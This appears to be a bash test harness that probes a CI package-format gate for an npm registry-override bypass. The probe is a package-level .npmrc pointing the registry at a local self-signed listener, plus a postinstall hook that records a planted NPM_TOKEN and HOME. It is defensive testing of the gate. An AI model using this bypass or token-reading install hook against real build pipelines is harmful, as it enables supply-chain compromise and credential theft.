#!/bin/bash
# Gate 1545 follow-up: can content arriving on a branch make the gate's install FETCH from a host outside the allow list,
# while every `resolved` in the lockfile passes the check? (a) a package-level .npmrc (copied into the stage by the gate)
# that sets registry= ; npm's replace-registry-host (default "npmjs") rewrites registry.npmjs.org resolved URLs to it.
S=/private/tmp/claude-501/-Volumes-DevMASTER-WEDNESDAY/2c8a1d0c-987e-41d3-84e7-d1d64d228275/scratchpad/g1545
EV=/Volumes/DevMASTER/WEDNESDAY/0_Brain/reference/2026-10-13_gate-pr1545/evidence
GATE=${GATE_UNDER_TEST:-$S/gates/gate_50f0552ce.sh}
W=$S/byp_$(date +%H%M%S)_$$; mkdir -p $W/hits $W/cases; export TMPDIR=$S/tmp
SENT=$W/hits/hits.log; SRVLOG=$W/srv.log; : > $SRVLOG; PN=gate1545-probe-dep
mkdir -p $W/src/pkg; printf '{ "name": "%s", "version": "1.0.0", "scripts": { "postinstall": "node pi.js" } }\n' $PN > $W/src/pkg/package.json
printf "require('fs').appendFileSync('%s', JSON.stringify({cwd:process.cwd(), NPM_TOKEN_seen: process.env.NPM_TOKEN||null, home: process.env.HOME})+'\\\\n')\n" "$SENT" > $W/src/pkg/pi.js
( cd $W/src/pkg && npm pack --pack-destination $W/src --cache $W/packcache --silent ) >/dev/null 2>&1
TGZ=$W/src/$PN-1.0.0.tgz; INTEG="sha512-$(openssl dgst -sha512 -binary $TGZ | base64 | tr -d '\n')"
openssl req -x509 -newkey rsa:2048 -nodes -keyout $W/k.pem -out $W/c.pem -days 2 -subj /CN=127.0.0.1 >/dev/null 2>&1
python3 -I $EV/tools/srvs.py $W/port $TGZ $SRVLOG $W/c.pem $W/k.pem & SRVPID=$!
for i in 1 2 3 4 5 6 7 8 9 10; do [ -s $W/port ] && break; sleep 0.3; done; PORT=$(cat $W/port)
echo "gate=$GATE md5=$(md5 -q $GATE) npm=$(npm -v) https listener port=$PORT (self-signed)"
mkcase() { local r=$W/cases/$1; mkdir -p $r/systemTest/scripts $r/systemTest/p $r/cache; cp $GATE $r/systemTest/scripts/check-package-format.sh
  printf '{ "name": "p", "version": "1.0.0", "scripts": { "format:check": "exit 0" }, "dependencies": { "%s": "1.0.0" } }\n' $PN > $r/systemTest/p/package.json
  printf '{"name":"p","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"p","version":"1.0.0","dependencies":{"%s":"1.0.0"}},"node_modules/%s":{"version":"1.0.0","resolved":"https://registry.npmjs.org/%s/-/%s-1.0.0.tgz","integrity":"%s","hasInstallScript":true}}}\n' $PN $PN $PN $PN "$INTEG" > $r/systemTest/p/package-lock.json
  [ -n "${2:-}" ] && printf '%s\n' "$2" > $r/systemTest/p/.npmrc; echo $r; }
row() { local name=$1 r=$2; shift 2; local before=$(wc -l < $SRVLOG)
  out=$(cd $r && printf 'systemTest/p/x.ts\n' | env -u npm_config_registry -u NPM_CONFIG_REGISTRY npm_config_cache=$r/cache NPM_TOKEN=PLANTED-npm-token "$@" bash $r/systemTest/scripts/check-package-format.sh 2>&1); rc=$?
  local gets=$(( $(wc -l < $SRVLOG) - before )); local runs=$(grep -c "\"cwd\":\"$r/" $SENT 2>/dev/null); runs=${runs:-0}
  local why=$(printf '%s\n' "$out" | grep -o -i -E 'lockfile has a source[^,]*|could not install its deps \(npm ci exited [0-9]+|INSTALLED' | head -1)
  printf '%-44s rc=%-2s listener_GETs=%-2s script_ran=%-2s %s\n' "$name" "$rc" "$gets" "$runs" "$why"; printf '%s\n' "$out" > $W/cases/$name.out; }
row B0_CONTROL_resolved_on_listener_REFUSED $(mkcase B0 "") FORMAT_GATE_LOCK_ALLOW=https://registry.npmjs.org/
sed -i '' "s#https://registry.npmjs.org/$PN/-/#https://127.0.0.1:$PORT/x/#" $W/cases/B0/systemTest/p/package-lock.json
row B0_CONTROL_resolved_on_listener_REFUSED_ $W/cases/B0
row B1_pkg_npmrc_registry_plus_strict_ssl_false $(mkcase B1 "registry=https://127.0.0.1:$PORT/
strict-ssl=false")
row B2_pkg_npmrc_registry_only_selfsigned $(mkcase B2 "registry=https://127.0.0.1:$PORT/")
row B3_CONTROL_no_npmrc_real_registry_404 $(mkcase B3 "")
echo "== hits =="; cat $SENT 2>/dev/null; echo "== listener log =="; cat $SRVLOG
for c in B1 B2 B3; do echo "-- npm log $c:"; grep -h -E 'http fetch|replace|cache' $W/cases/$c/cache/_logs/*.log 2>/dev/null | head -4; done
kill $SRVPID; echo workdir=$W
